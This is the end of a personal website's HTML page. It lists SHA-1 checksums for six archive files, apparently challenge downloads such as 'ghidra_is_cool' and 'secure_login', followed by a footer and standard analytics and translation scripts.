8d7de7e7cf2ae34b7ba2beb6c414efff763cd6c0  ghidra_is_cool.tar.gz
35c9e2de0478d8956acef4e610ac8fb56c6d83fd  light_house.tar.gz
a63bc115baac50f1492ee37795418cc708e8e667  meggenser.tar.gz
61b37abcd850dff10eccf485545881fcee4003b8  secure_login.tar.gz
7b41e2f8bbe3d0a93acc6dc71fe0b69b0290475e  shake_it.tar.gz
f388940ef76d94d6e974624e2fc6b50c985365df  tick_tock.tar.gz
-->



</div>
</article>





<footer>
<div id="copyright">&copy; 2010-2020 <a href="/">Kishan Bagaria</a></div>
<div><a target="_blank" href="https://twitter.com/KishanBagaria">Twitter</a> &middot; <a href="mailto:hi@kishan.info">Email</a> &middot; <a target="_blank" href="https://keybase.io/KishanBagaria">Keybase</a><br/><a href="javascript:document.documentElement.setAttribute('data-theme','dark')" class="hide-on-dark-mode">ð</a><a href="javascript:document.documentElement.setAttribute('data-theme','light')" class="hide-on-light-mode">ð</a></div>
<div id="gte"></div>
</footer>

</div>
</main>
</div>
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-15889022-12', 'auto');
ga('send', 'pageview');
</script>

    <script>
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE, gaTrack: true, gaId: 'UA-15889022-12'}, 'gte');
}
</script>
<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>


</body>
</html>
